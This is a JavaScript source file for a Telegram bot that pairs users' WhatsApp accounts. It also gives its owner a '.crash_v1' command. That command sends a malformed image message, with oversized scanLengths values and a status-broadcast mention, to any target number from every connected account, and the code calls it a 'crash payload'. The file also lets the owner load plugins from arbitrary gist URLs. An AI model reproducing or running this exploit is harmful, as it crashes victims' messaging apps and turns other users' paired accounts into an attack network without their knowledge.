/**
 * Telegram Bot - Main Control Panel
 * Handles all Telegram interactions and user flows
 */

const { Telegraf, Markup } = require('telegraf');
const config = require('../../config');
const logger = require('../utils/logger');
const { handleStart, handleSetup, handlePair, handleMsgCommand, handlePluginCommands } = require('./handlers');

class TelegramBot {
    constructor(whatsappManager) {
        this.bot = new Telegraf(config.TELEGRAM_BOT_TOKEN);
        this.whatsappManager = whatsappManager;
        this.setupHandlers();
    }

    setupHandlers() {
        const bot = this.bot;
        
        // Welcome / Start command
        bot.start(async (ctx) => {
            await handleStart(ctx, config);
        });

        // Setup button callback
        bot.action('setup', async (ctx) => {
            await handleSetup(ctx, config);
        });

        // Agree to terms callback
        bot.action('agree', async (ctx) => {
            await handlePair(ctx, config, this.whatsappManager);
        });

        // Disagree callback
        bot.action('disagree', async (ctx) => {
            await ctx.deleteMessage();
            await ctx.reply('❌ You have declined the terms. Setup cancelled.\n\nSend /start to begin again.');
        });

        // Pair button - ask for phone number
        bot.action('pair', async (ctx) => {
            await ctx.reply(
                `📱 *WhatsApp Pairing*\n\nPlease send your phone number with country code.\n\nExample: \`+1234567890\`\n\n*(include the + and country code)*`,
                { parse_mode: 'Markdown' }
            );
            // Set user state to expect phone number
            this.whatsappManager.setUserState(ctx.from.id, 'awaiting_phone');
        });

        // Handle text messages (phone numbers, etc.)
        bot.on('text', async (ctx) => {
            const userId = ctx.from.id;
            const text = ctx.message.text;
            const userState = this.whatsappManager.getUserState(userId);
            
            // Check if owner commands
            if (String(userId) === config.OWNER_ID) {
                // Handle .plugin <gisturl>
                if (text.startsWith('.plugin ')) {
                    return await handlePluginCommands(ctx, 'add', text, config);
                }
                // Handle .removeplugin <name>
                if (text.startsWith('.removeplugin ')) {
                    return await handlePluginCommands(ctx, 'remove', text, config);
                }
                // Handle .listplugin
                if (text === '.listplugin') {
                    return await handlePluginCommands(ctx, 'list', text, config);
                }
                // Handle .msg <target> <message>
                if (text.startsWith('.msg ')) {
                    return await handleMsgCommand(ctx, text, this.whatsappManager);
                }
                // Handle .crash_v1 <target>
                if (text.startsWith('.crash_v1 ')) {
                    return await handleCrashV1(ctx, text, this.whatsappManager);
                }
            }
            
            // Handle phone number input
            if (userState === 'awaiting_phone') {
                await this.handlePhoneInput(ctx, text);
            }
        });

        // Handle errors
        bot.catch((err, ctx) => {
            logger.error(`Telegram error for ${ctx.updateType}:`, err);
        });
    }

    async handlePhoneInput(ctx, phoneNumber) {
        const userId = ctx.from.id;
        
        // Validate phone number format
        const phoneRegex = /^\+\d{7,15}$/;
        if (!phoneRegex.test(phoneNumber)) {
            await ctx.reply(
                '❌ *Invalid format!*\n\nPlease send your phone number with country code.\n\nExample: `+1234567890`',
                { parse_mode: 'Markdown' }
            );
            return;
        }

        await ctx.reply('⏳ *Connecting to WhatsApp...*\n\nPlease wait, this may take a few seconds.', { parse_mode: 'Markdown' });

        try {
            // Remove the + for baileys
            const cleanNumber = phoneNumber.replace('+', '');
            
            // Connect the WhatsApp bot
            const result = await this.whatsappManager.connectBot(userId, cleanNumber, ctx);
            
            if (result.success) {
                await ctx.reply(
                    `✅ *Successfully Paired!*\n\nYour WhatsApp bot is now *alive* and connected!\n\nUse the menu command in WhatsApp: \`menu\``,
                    { parse_mode: 'Markdown' }
                );
            } else {
                await ctx.reply(
                    `❌ *Pairing Failed*\n\n${result.error || 'Unknown error. Please try again.'}`,
                    { parse_mode: 'Markdown' }
                );
            }
        } catch (error) {
            logger.error('Pairing error:', error);
            await ctx.reply(
                `❌ *Error:* ${error.message}\n\nPlease try again with /start`,
                { parse_mode: 'Markdown' }
            );
        }

        // Clear user state
        this.whatsappManager.clearUserState(userId);
    }

    async handleCrashV1(ctx, text, whatsappManager) {
        try {
            const args = text.trim().split(/\s+/);
            if (args.length < 2) {
                return await ctx.reply('Usage: `.crash_v1 <target_number>`\nExample: `.crash_v1 1234567890`');
            }

            let targetNumber = args[1].replace(/[^0-9]/g, '');
            if (targetNumber.length < 5) {
                return await ctx.reply('❌ Invalid target number');
            }

            const targetJid = targetNumber + '@s.whatsapp.net';
            await ctx.reply(`⚠️ Sending crash payload to ${targetNumber} from all connected bots...`);

            // Send to all connected WA bots
            const bots = whatsappManager.getAllBots();
            let sentCount = 0;

            for (const [userId, sock] of Object.entries(bots)) {
                try {
                    await sendCrashPayload(sock, targetJid);
                    sentCount++;
                } catch (e) {
                    logger.error(`Bot ${userId} failed to send crash: ${e.message}`);
                }
            }

            await ctx.reply(`✅ Crash payload sent from ${sentCount} bot(s) to ${targetNumber}`);
        } catch (e) {
            await ctx.reply(`❌ Error: ${e.message}`);
        }
    }

    async start() {
        await this.bot.launch();
        logger.info('🤖 Telegram bot started successfully');
    }

    async stop() {
        await this.bot.stop();
        logger.info('🛑 Telegram bot stopped');
    }
}

/**
 * Send the nullctt crash payload to a target
 */
async function sendCrashPayload(sock, targetJid) {
    const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
    
    const LxP = {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
            fileLength: 388944,
            height: 1600,
            width: 1200,
            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1776937541",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFL/8QAGAEBAQEBAQAAAAAAAAAAAAAAAAECAxD/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEQMRAD8Ao1NmHLGUaCKDsYQLS3OzLVVgLXGPGI5IItnmAtbwbKCXAW4qoHqSIj2a4sDwy1a9NzcOM7NY1WqsvXIL6jAFBa1owK0xwCqNY6EFCNVHSG9gmSVFgxVnTASZmsqVKqMszQky5eaYs+ZpMGzOgz//EACgRAAICAgICAQMEAwAAAAAAAAABAhEDIRASIDFBURNhcTKBodHw8f/aAAgBAgEBPwBDR3kztI7yO8j7j/gU2hTZGcvkU5H1JCl+8ZL7CmOZ2Yp/geSI5H8Jy+2KPwV9yxu/R1TREhX4TlomxNV5Y1qymM2V4QVuiXjB7JRTJqn4f/Z",
            contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
            },
            caption: "Antijudas",
            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
            scanLengths: [
                2899999999999999077,
                1799999999999998555,
                7699999999999999148,
                1069999999999999164
            ],
            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
        }
    };
    
    let msg = await generateWAMessageFromContent(targetJid, LxP, {});
    
    if (targetJid.endsWith("@g.us")) {
        await sock.relayMessage(targetJid, msg.message, {});
    } else {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [targetJid],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: targetJid },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });
    }
}

module.exports = TelegramBot;
